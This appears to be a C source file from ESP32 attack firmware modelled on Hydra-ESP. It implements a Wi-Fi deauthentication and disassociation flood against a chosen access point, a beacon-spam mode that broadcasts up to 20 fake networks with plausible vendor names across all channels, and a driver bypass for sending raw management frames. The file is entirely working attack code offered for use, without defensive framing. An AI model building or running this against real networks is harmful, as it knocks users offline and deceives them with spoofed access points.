#include "svc_deauth.h"
#include "svc_target.h"
#include "svc_wifi.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_random.h"
#include <string.h>

static const char *TAG = "svc_deauth";

#define BEACON_POOL_MAX     20   /* Hydra-ESP's default live-AP count */
#define BEACON_POOL_DEFAULT 20
#define BEACON_SSID_MAX     32   /* 802.11 caps SSIDs at 32 octets */
/* Ticks (x100 ms) held on one channel before hopping. A scanning client
 * sweeps all 13 channels, so pinning to one only ever exposes the pool to
 * the slice of scan time it spends there. */
#define BEACON_HOP_TICKS    3
#define BEACON_CH_MAX       13

typedef struct {
    uint8_t bssid[6];
    char    ssid[BEACON_SSID_MAX + 1];
    int     ssid_len;
} beacon_ap_t;

static esp_timer_handle_t s_timer = NULL;
static uint8_t s_bssid[6];        /* target BSSID (deauth/disassoc) */
static beacon_ap_t s_pool[BEACON_POOL_MAX]; /* fake APs live this run */
static int s_pool_count = 0;      /* entries actually beaconing */
static uint32_t s_beacons = 0;    /* fake APs in the pool */
static int s_channel = 1;         /* pinned channel, clamped 1..13 */
static int s_chan_cursor = 0;     /* beacon-mode hop cursor (0 -> hop to 1) */
static int s_hop_left = 0;        /* ticks left before the next hop */
static beacon_name_mode_t s_name_mode = BEACON_NAMES_COMMON;
static volatile uint32_t s_frames = 0;
static volatile int s_tx_err = 0;      /* first TX error since start */
static volatile int s_tx_errcode = 0;
static volatile uint32_t s_ticks = 0; /* TX callback invocations */
static volatile int s_last_err = 0;
static volatile int s_beacon_ok = 0;  /* driver accepts beacon frames? */
static int64_t s_started_us = 0;      /* run start, for timeout + elapsed */
static volatile int s_expired = 0;     /* timeout reached; owner must stop */
static volatile uint32_t s_fps = 0;   /* smoothed frames/second */
static uint32_t s_win_frames = 0;     /* fps window bookkeeping */
static int64_t s_win_us = 0;
static deauth_mode_t s_mode = DEAUTH_MODE_DEAUTH;

#define DEAUTH_PERIOD_US 100000 /* Hydra-ESP broadcast cadence */

/* Raw management templates, matching Hydra-ESP's wsl_bypasser frames:
 *   deauth     FC c0, reason 0x0002 (prev auth not valid)
 *   disassoc   FC a0, reason 0x0001 (unspecified)
 * dst broadcast, addr2/addr3 patched with the BSSID, seq f0 ff. */
static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
    static const uint8_t tpl[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00,
    };
    memcpy(f, tpl, sizeof(tpl));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
}

static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
    static const uint8_t tpl[26] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x01, 0x00,
    };
    memcpy(f, tpl, sizeof(tpl));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
}

/* Beacon spam. Architecture follows Hydra-ESP's attack_beacon_spam.c: a
 * POOL of fake APs is built once at start and every identity beacons on
 * every tick, so all of them are alive in the client's scan list at the
 * same time. Rotating one identity at a time (the obvious first design)
 * only ever leaves a couple visible - silent entries age out of a scan
 * list within seconds.
 *
 * Names are vendor-plausible ("Netgear_WiFi"), not random strings: scan
 * UIs and stacks treat random-looking SSIDs as junk. Every pool entry keeps
 * one locally-administered BSSID for the whole run.
 *
 * Layout: mgmt hdr (24) | TSF (8) | interval (2) | capability (2) |
 * SSID tag (2 + len) | DS param set (3). Returns the frame length. */
static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel,
                        const char *ssid, int ssid_len) {
    static uint32_t tsf = 0;
    static uint16_t seq = 0;
    if (tsf == 0) {
        tsf = esp_random();          /* any plausible starting TSF */
        if (tsf == 0) {
            tsf = 0x10000000;
        }
    }
    tsf += 100 * 1024;               /* +100 TU, matching the interval */
    seq++;

    if (ssid_len < 1) {
        ssid_len = 1;
    }
    if (ssid_len > BEACON_SSID_MAX) {
        ssid_len = BEACON_SSID_MAX;
    }
    f[0] = 0x80;                     /* mgmt / beacon */
    f[1] = 0x00;
    f[2] = 0x00;                     /* duration: 0 is normal for beacons */
    f[3] = 0x00;
    memset(f + 4, 0xff, 6);          /* addr1: broadcast */
    memcpy(f + 10, bssid, 6);        /* addr2: source = this fake AP */
    memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
    f[22] = (uint8_t)(seq >> 4);     /* sequence control */
    f[23] = (uint8_t)((seq & 0xf) << 4);
    f[24] = (uint8_t)(tsf & 0xff);
    f[25] = (uint8_t)((tsf >> 8) & 0xff);
    f[26] = (uint8_t)((tsf >> 16) & 0xff);
    f[27] = (uint8_t)((tsf >> 24) & 0xff);
    f[28] = 0x00;                    /* upper 4 bytes of the 8-byte TSF */
    f[29] = 0x00;
    f[30] = 0x00;
    f[31] = 0x00;
    f[32] = 0x64;                    /* beacon interval 100 TU */
    f[33] = 0x00;
    f[34] = 0x01;                    /* capability info: ESS (as Hydra) */
    f[35] = 0x04;
    f[36] = 0x00;                    /* SSID tag */
    f[37] = (uint8_t)ssid_len;
    memcpy(f + 38, ssid, (size_t)ssid_len);
    int o = 38 + ssid_len;
    f[o++] = 0x03;                   /* DS parameter set: current channel */
    f[o++] = 0x01;
    f[o++] = (uint8_t)channel;
    return o;
}

/* Vendor-plausible name parts (Hydra-ESP's sets). Random-looking SSIDs get
 * collapsed or deprioritised by scan UIs; names that look like real gear
 * get listed and kept. */
static const char *const s_bases[] = {
    "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link",
    "Home", "Office", "Starlink", "Free Public WiFi",
};
static const char *const s_suffixes[] = {
    "_WiFi", "-Guest", "-5G", "_Secure", "",
};
#define N_BASES    (sizeof(s_bases) / sizeof(s_bases[0]))
#define N_SUFFIXES (sizeof(s_suffixes) / sizeof(s_suffixes[0]))

static const char *const s_rick[] = {
    "Never Gonna Give You Up", "Never Gonna Let You Down",
    "Never Gonna Run Around", "And Desert You",
    "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
};
static const char *const s_secure[] = {
    "FBI Surveillance Van 04", "Virus.exe", "Get Off My LAN",
    "Loading...", "Searching...", "Click for virus",
};
#define N_RICK    (sizeof(s_rick) / sizeof(s_rick[0]))
#define N_SECURE  (sizeof(s_secure) / sizeof(s_secure[0]))

/* Copy a name into the pool entry, clamped to the 802.11 SSID cap. */
static void ap_set_name(beacon_ap_t *ap, const char *s) {
    int n = 0;
    while (s[n] && n < BEACON_SSID_MAX) {
        ap->ssid[n] = s[n];
        n++;
    }
    ap->ssid[n] = 0;
    ap->ssid_len = n;
}

/* Fill ap->ssid from one list. index makes the fixed lists walk in order
 * instead of repeating (seeded so a pool is a mix, not one name). */
static void ap_name_from(beacon_ap_t *ap, beacon_name_mode_t m, int index) {
    char tmp[BEACON_SSID_MAX + 1];
    switch (m) {
        case BEACON_NAMES_COMMON:
            snprintf(tmp, sizeof(tmp), "%s%s",
                     s_bases[esp_random() % N_BASES],
                     s_suffixes[esp_random() % N_SUFFIXES]);
            ap_set_name(ap, tmp);
            break;
        case BEACON_NAMES_GARBAGE: {
            static const char charset[] =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
                "0123456789!@#$%^&*()_+-=[]{}|;";
            const size_t clen = sizeof(charset) - 1;
            int len = 8 + (int)(esp_random() % 12);
            if (len > BEACON_SSID_MAX) {
                len = BEACON_SSID_MAX;
            }
            for (int i = 0; i < len; i++) {
                tmp[i] = charset[esp_random() % clen];
            }
            tmp[len] = 0;
            ap_set_name(ap, tmp);
            break;
        }
        case BEACON_NAMES_RICKROLL:
            ap_set_name(ap, s_rick[(size_t)index % N_RICK]);
            break;
        case BEACON_NAMES_SECURITY:
            ap_set_name(ap, s_secure[(size_t)index % N_SECURE]);
            break;
        default:   /* BEACON_NAMES_ALL: one source per entry */
            ap_name_from(ap, (beacon_name_mode_t)(esp_random() %
                            (BEACON_NAMES_COUNT - 1)), index);
            break;
    }
}

/* Build the pool of fake APs. BSSIDs are locally administered (unicast,
 * bit 1 set) so they cannot collide with a real vendor OUI. */
static void beacon_pool_build(int count) {
    if (count < 1) {
        count = 1;
    }
    if (count > BEACON_POOL_MAX) {
        count = BEACON_POOL_MAX;
    }
    for (int i = 0; i < count; i++) {
        beacon_ap_t *ap = &s_pool[i];
        for (int k = 0; k < 6; k++)
            ap->bssid[k] = (uint8_t)esp_random();
        ap->bssid[0] |= 0x02;            /* locally administered */
        ap->bssid[0] &= (uint8_t)~0x01;  /* unicast */
        /* ALL picks a source per entry, so seed the fixed lists with the
         * entry index to keep the pool varied rather than one repeated. */
        beacon_name_mode_t m = s_name_mode;
        if (m == BEACON_NAMES_ALL) {
            m = (beacon_name_mode_t)(esp_random() % (BEACON_NAMES_COUNT - 1));
        }
        ap_name_from(ap, m, i + (int)(esp_random() % 7));
    }
    s_pool_count = count;
    s_beacons = (uint32_t)count;
}

static void tx_tick(void *arg) {
    (void)arg;
    s_ticks++;                       /* proof the callback fires at all */
    /* TX goes through the WSL bypass so the driver's frame-type gate
     * accepts management subtypes (see wsl_bypasser.h). */
    uint8_t f[80];
    int ok_count = 0;
    esp_err_t err = ESP_OK;
    if (s_mode == DEAUTH_MODE_BEACON) {
        /* Hop across the band so a channel-sweeping client meets the pool
         * everywhere instead of only on one pinned channel. */
        if (s_hop_left <= 0) {
            s_hop_left = BEACON_HOP_TICKS;
            s_chan_cursor++;
            if (s_chan_cursor > BEACON_CH_MAX) {
                s_chan_cursor = 1;
            }
            esp_wifi_set_channel((uint8_t)s_chan_cursor,
                                WIFI_SECOND_CHAN_NONE);
            s_channel = s_chan_cursor;
        }
        s_hop_left--;
        /* Every pool entry beacons every tick (Hydra-ESP behaviour): the
         * whole fake estate is live at once, so a scan list keeps them
         * all instead of expiring the ones that went quiet. */
        for (int i = 0; i < s_pool_count; i++) {
            int len = build_beacon(f, s_pool[i].bssid, s_channel,
                                   s_pool[i].ssid, s_pool[i].ssid_len);
            err = wsl_send_raw(f, len);
            s_last_err = (int)err;
            if (err == ESP_OK) {
                ok_count++;
            } else if (!s_tx_err) {
                s_tx_err = 1;
                s_tx_errcode = (int)err;
            }
        }
    } else {
        int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
        for (int i = 0; i < passes; i++) {
            if (s_mode == DEAUTH_MODE_DISASSOC) {
                build_disassoc(f, s_bssid);
            } else {
                build_deauth(f, s_bssid);
            }
            err = wsl_send_raw(f, 26);
            s_last_err = (int)err;
            if (err == ESP_OK) {
                ok_count++;
            }
        }
    }
    s_frames += (uint32_t)ok_count;
    if (err != ESP_OK && !s_tx_err) {
        s_tx_err = 1;
        s_tx_errcode = (int)err;
    }

    /* Frame rate over a ~1 s window. */
    int64_t now = esp_timer_get_time();
    if (s_win_us == 0) {
        s_win_us = now;
        s_win_frames = s_frames;
    }
    int64_t d = now - s_win_us;
    if (d >= 1000000) {
        s_fps = (uint32_t)(((uint64_t)(s_frames - s_win_frames) * 1000000ULL) /
                           (uint64_t)d);
        s_win_us = now;
        s_win_frames = s_frames;
    }

    /* Auto-stop flag. The timer cannot delete itself from its own
     * callback, so only raise the flag; the owner stops the attack. */
    if (!s_expired &&
        (uint64_t)(now - s_started_us) >= (uint64_t)DEAUTH_TIMEOUT_S * 1000000ULL)
        s_expired = 1;
}

/* Probe: send one frame and report what the driver says. TX goes through
 * the WSL bypass (wsl_bypasser.h), which overrides the driver's frame-type
 * gate; without it esp_wifi_80211_tx() returns ESP_ERR_INVALID_ARG for
 * management subtypes like deauth on a stock ESP-IDF. */
static esp_err_t probe_subtype(uint8_t fc0) {
    uint8_t f[26];
    build_deauth(f, s_bssid);
    f[0] = fc0;
    return wsl_send_raw(f, (int)sizeof(f));
}

static esp_err_t probe_tx(void) {
    return probe_subtype(0xc0); /* deauth */
}

int svc_deauth_start(deauth_mode_t mode) {
    if (s_timer)
        return 0;
    if (mode >= DEAUTH_MODE_COUNT)
        return -1;
    /* Beacon spam invents its own BSSIDs, so it needs no session target;
     * the deauth family requires one. */
    if (mode != DEAUTH_MODE_BEACON && !tgt_wifi_has())
        return -1;
    s_mode = mode;
    memcpy(s_bssid, tgt_wifi_bssid(), 6);
    if (svc_wifi_init() != 0)
        return -2;
    esp_wifi_set_ps(WIFI_PS_NONE);
    int ch = tgt_wifi_channel();
    if (ch < 1)
        ch = 1;
    if (ch > 13)
        ch = 13;
    s_channel = ch;
    if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
        return -3;
    esp_err_t perr = probe_tx();
    s_beacon_ok = probe_subtype(0x80) == ESP_OK;
    if (perr != ESP_OK) {
        s_tx_errcode = (int)perr;
        return -6;   /* driver refused the frame */
    }
    s_frames = 0;
    s_tx_err = 0;
    s_tx_errcode = 0;
    s_ticks = 0;
    s_last_err = 0;
    s_pool_count = 0;
    s_beacons = 0;
    s_chan_cursor = 0;
    s_hop_left = 0;
    if (s_mode == DEAUTH_MODE_BEACON)
        beacon_pool_build(BEACON_POOL_DEFAULT);
    s_expired = 0;
    s_fps = 0;
    s_win_frames = 0;
    s_win_us = 0;
    s_started_us = esp_timer_get_time();
    esp_timer_create_args_t a = {
        .callback = tx_tick,
        .name = "deauth",
    };
    if (esp_timer_create(&a, &s_timer) != ESP_OK) {
        s_timer = NULL;
        return -4;
    }
    if (esp_timer_start_periodic(s_timer, DEAUTH_PERIOD_US) != ESP_OK) {
        esp_timer_delete(s_timer);
        s_timer = NULL;
        return -5;
    }
    ESP_LOGI(TAG, "running, mode %s, ch %d",
             svc_deauth_mode_name(s_mode), ch);
    return 0;
}

void svc_deauth_stop(void) {
    if (!s_timer)
        return;
    esp_timer_stop(s_timer);
    esp_timer_delete(s_timer);
    s_timer = NULL;
    ESP_LOGI(TAG, "stopped, %lu frames", (unsigned long)s_frames);
}

int svc_deauth_running(void) { return s_timer != NULL; }

uint32_t svc_deauth_frames(void) { return s_frames; }

int svc_deauth_tx_error(void) { return s_tx_errcode; }

uint32_t svc_deauth_ticks(void) { return s_ticks; }

uint32_t svc_deauth_beacons(void) { return s_beacons; }

uint32_t svc_deauth_fake_aps(void) {
    /* Fake APs currently live in the pool - each one beacons every tick,
     * so all of them are simultaneously visible to a scanner. */
    return (uint32_t)s_pool_count;
}

int svc_deauth_beacon_ok(void) { return s_beacon_ok; }

int svc_deauth_expired(void) { return s_expired; }

uint32_t svc_deauth_fps(void) { return s_fps; }

uint32_t svc_deauth_elapsed_s(void) {
    if (!s_timer)
        return 0;
    return (uint32_t)((uint64_t)(esp_timer_get_time() - s_started_us) /
                      1000000ULL);
}

uint32_t svc_deauth_remaining_s(void) {
    if (!s_timer)
        return 0;
    uint32_t e = svc_deauth_elapsed_s();
    return e >= DEAUTH_TIMEOUT_S ? 0 : DEAUTH_TIMEOUT_S - e;
}

deauth_mode_t svc_deauth_mode(void) { return s_mode; }

int svc_deauth_mode_needs_target(deauth_mode_t m) {
    return m != DEAUTH_MODE_BEACON;
}

void svc_deauth_set_name_mode(beacon_name_mode_t m) {
    if (m >= BEACON_NAMES_COUNT) {
        m = BEACON_NAMES_COMMON;
    }
    s_name_mode = m;
}

beacon_name_mode_t svc_deauth_name_mode(void) { return s_name_mode; }

const char *svc_deauth_name_mode_name(beacon_name_mode_t m) {
    switch (m) {
        case BEACON_NAMES_COMMON:   return "COMMON";
        case BEACON_NAMES_GARBAGE:  return "GARBAGE";
        case BEACON_NAMES_RICKROLL: return "RICKROLL";
        case BEACON_NAMES_SECURITY: return "SECURITY";
        case BEACON_NAMES_ALL:      return "ALL";
        default:                    return "?";
    }
}

uint32_t svc_deauth_beacon_pool(void) {
    return (uint32_t)BEACON_POOL_DEFAULT;
}

const char *svc_deauth_mode_name(deauth_mode_t m) {
    switch (m) {
        case DEAUTH_MODE_DEAUTH:   return "Deauth";
        case DEAUTH_MODE_DISASSOC: return "Disassoc";
        case DEAUTH_MODE_COMBINED: return "Deauth+Disassoc";
        case DEAUTH_MODE_BEACON:   return "BeaconSpam";
        default:                   return "?";
    }
}